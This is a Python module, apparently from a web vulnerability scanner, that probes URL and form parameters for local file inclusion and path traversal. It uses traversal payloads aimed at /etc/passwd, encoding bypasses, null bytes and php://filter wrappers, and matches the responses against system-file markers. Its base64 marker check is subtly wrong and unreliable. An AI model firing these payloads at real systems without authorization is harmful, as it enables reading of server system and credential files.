"""
LFIModule - Local File Inclusion and path traversal testing.

Tests discovered parameters for LFI/path traversal vulnerabilities
using encoding bypass techniques and known file markers.
"""

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.utils import (
    print_info,
    print_good,
    print_warning,
    print_error,
    print_vuln,
    get_session,
)
from core.config import Config
import logging


class LFIModule:

    LINUX_MARKERS = ["root:x:0:0", "daemon:x:", ":/bin/bash", "/bin/sh"]
    WINDOWS_MARKERS = ["[boot loader]", "[fonts]", "[extensions]", "for 16-bit app support"]

    ENCODING_BYPASSES = [
        ("double_encode", lambda p: p.replace(".", "%252e").replace("/", "%252f")),
        ("null_byte", lambda p: p + "%00"),
        ("utf8_encode", lambda p: p.replace(".", "%c0%ae").replace("/", "%c0%af")),
        ("php_wrappers", lambda p: f"php://filter/convert.base64-encode/resource={p}"),
    ]

    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Config.PATH_TRAVERSAL

    def run(self, target: str, session=None):
        print_info(f"Running LFI/path traversal tests on {target}...")
        results: Dict[str, Any] = {
            "target": target,
            "vulnerable_params": [],
            "findings": [],
        }

        params = self._extract_params(target, session)
        if not params:
            print_info("No injectable parameters found for LFI testing.")
            self.scanner.scan_data["lfi"] = results
            return results

        print_info(f"Testing {len(params)} parameter(s) for LFI...")
        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET")

            if not param_name:
                continue

            vulns = self.run_on_params(target, [param_info], session)
            if vulns:
                results["vulnerable_params"].append(param_info)
                results["findings"].extend(vulns)

        self.scanner.scan_data["lfi"] = results
        return results

    def run_on_params(self, target: str, params: List[Dict[str, Any]], session=None) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if session is None:
            session = get_session()

        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET").upper()

            if not param_name:
                continue

            print_info(f"  Testing parameter '{param_name}' on {url}")

            result = self.test_path_traversal(url, param_name, session, method)
            if result:
                findings.append(result)
                continue

            result = self.test_lfi_payloads(url, param_name, session)
            if result:
                findings.append(result)

        return findings

    def test_path_traversal(self, url: str, param: str, session, method: str = "GET") -> Optional[Dict[str, Any]]:
        print_info(f"    Path traversal test on '{param}'...")

        for payload in self.payloads:
            try:
                resp = self._make_request(url, param, payload, method, session)
                body = resp.text or ""
                body_lower = body.lower()

                for marker in self.LINUX_MARKERS:
                    if marker.lower() in body_lower:
                        finding = {
                            "type": "path_traversal",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": marker,
                            "os": "linux",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"Path traversal in '{param}' @ {url} | "
                            f"Payload: {payload} | Evidence: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[LFI] {url} param={param} payload='{payload}' os=linux evidence='{marker}'"
                        )
                        return finding

                for marker in self.WINDOWS_MARKERS:
                    if marker.lower() in body_lower:
                        finding = {
                            "type": "path_traversal",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": marker,
                            "os": "windows",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"Path traversal in '{param}' @ {url} | "
                            f"Payload: {payload} | Evidence: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[LFI] {url} param={param} payload='{payload}' os=windows evidence='{marker}'"
                        )
                        return finding

                base64_marker = "cm9vd:"
                if base64_marker in body:
                    finding = {
                        "type": "path_traversal",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "evidence": "base64_encoded_lfi",
                        "os": "unknown",
                        "status_code": resp.status_code,
                    }
                    print_vuln(f"Possible LFI (base64 encoded) in '{param}' @ {url}")
                    self.scanner.findings.append(f"[LFI:BASE64] {url} param={param}")
                    return finding

            except Exception:
                logging.exception("lfi.py: exception")
                continue
        print_info(f"    No path traversal found for '{param}'.")
        return None

    def test_lfi_payloads(self, url: str, param: str, session) -> Optional[Dict[str, Any]]:
        print_info(f"    Testing encoding bypass LFI payloads on '{param}'...")

        base_traversal = "../../../../etc/passwd"

        for bypass_name, encoder in self.ENCODING_BYPASSES:
            try:
                payload = encoder(base_traversal)
                resp = session.get(
                    self._inject_param(url, param, payload),
                    timeout=self.config.timeout,
                    verify=self.config.verify_tls,
                )
                body = resp.text or ""
                body_lower = body.lower()

                for marker in self.LINUX_MARKERS:
                    if marker.lower() in body_lower:
                        finding = {
                            "type": "lfi_encoding_bypass",
                            "url": url,
                            "param": param,
                            "method": "GET",
                            "payload": payload,
                            "bypass": bypass_name,
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"LFI encoding bypass ({bypass_name}) in '{param}' @ {url} | "
                            f"Payload: {payload}"
                        )
                        self.scanner.findings.append(
                            f"[LFI:BYPASS] {url} param={param} bypass={bypass_name}"
                        )
                        return finding
            except Exception:
                logging.exception("lfi.py: exception")
                continue
        print_info(f"    No encoding bypass LFI found for '{param}'.")
        return None

    def _make_request(self, url: str, param: str, payload: str, method: str, session):
        if method == "GET":
            test_url = self._inject_param(url, param, payload)
            return session.get(test_url, timeout=self.config.timeout, verify=self.config.verify_tls)
        else:
            return session.post(url, data={param: payload}, timeout=self.config.timeout, verify=self.config.verify_tls)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _extract_params(self, target: str, session=None) -> List[Dict[str, Any]]:
        params: List[Dict[str, Any]] = []

        crawl_data = self.scanner.scan_data.get("crawl", {})
        forms = crawl_data.get("forms", [])
        for form in forms:
            form_url = form.get("url", target)
            for fp in form.get("params", []):
                params.append({
                    "url": form_url,
                    "name": fp.get("name", ""),
                    "method": form.get("method", "GET"),
                })

        parsed = urlparse(target)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            params.append({
                "url": target,
                "name": key,
                "method": "GET",
            })

        seen = set()
        unique_params = []
        for p in params:
            k = (p["url"], p["name"], p["method"])
            if k not in seen:
                seen.add(k)
                unique_params.append(p)

        return unique_params
